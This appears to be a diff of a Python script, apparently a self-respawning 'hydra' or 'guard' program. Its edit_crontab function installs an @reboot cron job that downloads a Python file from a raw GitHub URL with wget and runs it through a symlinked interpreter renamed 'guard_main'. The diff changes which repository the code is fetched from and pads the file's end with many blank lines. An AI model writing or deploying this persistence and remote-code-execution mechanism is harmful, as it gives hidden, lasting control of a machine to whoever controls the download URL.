@@ -40,7 +40,7 @@ def getpid(name):
 
 def edit_crontab():
     tempfile = 'temp_'+randstring(5)
-    url = 'https://raw.githubusercontent.com/Lithostheory/python_hydra/main/hydra_v0.1.py'
+    url = 'https://raw.githubusercontent.com/youhtubecommissie/webwaakhond/main/main.py'
     command = '/usr/bin/cd ~ ; /usr/bin/wget -O mainfile_webcheck.py %s ; /usr/bin/ln -s /usr/bin/python2.7 guard_main ; ./guard_main mainfile_webcheck.py 0'%(url)
     os.system('/usr/bin/echo "@reboot %s" > %s ; /usr/bin/crontab %s ; /usr/bin/rm %s'%(command,tempfile,tempfile,tempfile))
     return
@@ -291,6 +291,60 @@ else:
     logprint('entering mainmode')
     set_up_guardmode(50)
     webcheck()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
